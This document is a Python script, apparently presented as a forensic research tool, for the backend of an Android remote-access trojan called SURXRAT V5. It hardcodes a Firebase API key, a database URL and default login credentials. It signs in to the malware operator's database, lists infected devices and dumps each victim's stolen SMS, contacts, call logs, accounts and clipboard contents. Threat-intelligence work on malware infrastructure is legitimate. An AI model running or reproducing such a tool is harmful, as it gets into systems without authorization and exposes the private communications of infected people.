import requests
import json
import sys
import argparse

class SurxratAPI:
    """
    SURXRAT V5 Forensic API Service
    Provides high-level access to the exfiltrated data without 2FA requirements.
    """
    def __init__(self, email, password):
        self.api_key = "AIzaSyDfHMsNoknifGnkJEr6DJPSoEiwmbmlYBc"
        self.db_url = "https://fir-e9e7b-default-rtdb.firebaseio.com"
        self.email = email
        self.password = password
        self.token = None

    def authenticate(self):
        url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={self.api_key}"
        payload = {"email": self.email, "password": self.password, "returnSecureToken": True}
        try:
            res = requests.post(url, json=payload)
            if res.status_code == 200:
                self.token = res.json()['idToken']
                return True
            else:
                print(f"Auth Error: {res.json().get('error', {}).get('message', 'Unknown')}")
                return False
        except Exception as e:
            print(f"Connection Error: {e}")
            return False

    def fetch(self, path, shallow=False):
        if not self.token: return None
        url = f"{self.db_url}/{path}.json?auth={self.token}"
        if shallow: url += "&shallow=true"
        res = requests.get(url)
        return res.json() if res.status_code == 200 else None

    def get_victims(self):
        return self.fetch("surxrat5", shallow=True)

    def get_full_record(self, uid):
        """Aggregates all known paths for a single victim."""
        record = {
            "metadata": self.fetch(f"surxrat5/{uid}"),
            "sms": self.fetch(f"database/sms/{uid}"),
            "contacts": self.fetch(f"database/contacts/{uid}"),
            "calls": self.fetch(f"database/calls/{uid}"),
            "accounts": self.fetch(f"database/accounts/{uid}"),
            "clipboard": self.fetch(f"clipboard/{uid}"),
            "anti_uninstall": self.fetch(f"anti_uninstall/{uid}")
        }
        if record["metadata"] and "cam_result" in record["metadata"]:
            del record["metadata"]["cam_result"]
        return record

def main():
    parser = argparse.ArgumentParser(description="SURXRAT V5 Forensic API Service")
    parser.add_argument("--email", default="research_alt_test@gmail.com", help="Researcher Email")
    parser.add_argument("--password", default="ResearchAltPassword123!", help="Researcher Password")
    parser.add_argument("--list", action="store_true", help="List all infected device IDs")
    parser.add_argument("--get", metavar="UID", help="Get full forensic record for a specific UID")
    parser.add_argument("--output", help="Save output to file")

    args = parser.parse_args()
    api = SurxratAPI(args.email, args.password)

    print("[*] Authenticating...")
    if not api.authenticate():
        print("[!] Authentication failed. Check credentials or API Key.")
        sys.exit(1)

    if args.list:
        victims = api.get_victims()
        if victims:
            print(f"[*] Total Infected Devices: {len(victims)}")
            for uid in victims.keys(): print(f" - {uid}")
    
    elif args.get:
        print(f"[*] Fetching full record for {args.get}...")
        data = api.get_full_record(args.get)
        if args.output:
            with open(args.output, 'w') as f: json.dump(data, f, indent=2)
            print(f"[+] Data saved to {args.output}")
        else:
            print(json.dumps(data, indent=2))

if __name__ == "__main__":
    main()
